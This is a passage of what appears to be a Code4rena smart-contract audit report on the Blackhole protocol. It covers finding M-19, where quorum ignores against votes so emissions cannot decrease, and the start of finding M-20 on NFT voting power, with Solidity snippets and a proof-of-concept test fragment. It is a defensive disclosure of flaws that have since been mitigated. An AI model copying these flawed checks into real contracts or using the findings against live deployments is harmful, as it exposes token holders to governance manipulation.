class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Abstain Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evotingPeriod\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochTimehash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//Look at the logs and status of the Governor\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-42\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-10\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-33\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease\" style=\"position:relative;\"\u003e\u003ca href=\"#m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease\" aria-label=\"m 19 quorum does not include the againstvotes leading to emissions rate staying the same even if it should decrease permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-306\"\u003e[M-19] Quorum does not include the \u003ccode\u003eagainstVotes\u003c/code\u003e leading to emissions rate staying the same even if it should decrease\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-419\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L184-L191\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L184-L191\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L680-L684\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L680-L684\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L138-L155\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/MinterUpgradeable.sol#L138-L155\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-7\" aria-label=\"finding description and impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eBlackGovernor\u003c/code\u003e should be able to, based on user votes determine the status of the proposal and then execute it. We can see from the code that if proposal succeeds, then the emissions inside the \u003ccode\u003eMinterUpgradeable\u003c/code\u003e should decrease by 1%, if proposal is defeated it should decrease by 1%, otherwise, if quorum is not reached or the \u003ccode\u003eforVotes\u003c/code\u003e/\u003ccode\u003eagainstVotes\u003c/code\u003e are not big enough compared to abstain votes (which means proposal state is expired) the emissions should stay the same.\u003c/p\u003e\n\u003cp\u003eHowever, when determining the status of the proposal the following check is made:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// quorum reached is basically a percentage check which is of the number specified in constructor of the L2GovernorVotesQuorumFraction(4) // 4%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_voteSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_voteDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eExpired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFrom the code we can see that if quorum is not reached it, the proposal is considered Expired after the voting period has ended. However, due to the fact that \u003ccode\u003e_quorumReachedFunction\u003c/code\u003e is using ONLY the \u003ccode\u003eforVotes\u003c/code\u003e and \u003ccode\u003eabstainVotes\u003c/code\u003e, which is incorrect based on the functionality that protocol wants to introduce, we can imagine the following scenario:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe emissions are high, and almost all of the users agree that they should decrease the emissions rate.\u003c/li\u003e\n\u003cli\u003e99% of votes are \u003ccode\u003eagainstVotes\u003c/code\u003e as almost everybody agrees that emissions should decrease.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe voting period for the proposal ends\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUser tries to execute the proposal expecting that the emissions rate will decrease as 99% of the votes were against and this amount of votes should meet the quorum.\u003c/li\u003e\n\u003cli\u003eThe function executes but it calculates the state as Expired because according to it quorum has not been reached as against votes DO NOT count into the quorum.\u003c/li\u003e\n\u003cli\u003eThe emissions rate stay the same even though “all” of the voting users agreed that it should decrease.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eQuorum reached snippet:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eProposalVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalvote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_proposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003equorum\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalSnapshot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026lt;=\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit NO AGAINST VOTES\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposalvote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalvote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see that evaluation whether quorum was reached or not is incorrect based on the functionality that protocol wants to achieve leading to, for example, decrease of the emissions rate by the \u003ccode\u003eBlackGovernor\u003c/code\u003e being not possible, when almost everybody agrees to do so. Based on the provided facts, I think this should be Medium severity finding as it disrupts the emissions of the BlackToken.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eWhen evaluating whether quorum was reached, take against votes into the account.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-41\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-8\"\u003elonelybones\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L668\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L668\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote\" style=\"position:relative;\"\u003e\u003ca href=\"#m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote\" aria-label=\"m 20 getsmnftpastvotes incorrectly checks for voting power leading to some nfts incorrectly being eligible to vote permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-274\"\u003e[M-20] \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e incorrectly checks for Voting Power leading to some NFTs incorrectly being eligible to vote\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-423\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/libraries/VotingBalanceLogic.sol#L20-L43\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/libraries/VotingBalanceLogic.sol#L20-L43\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e function checks what was the voting power of the some account at specific point in time.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetsmNFTPastVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_checkIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingDelegationLib\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastVotesIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ecpData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 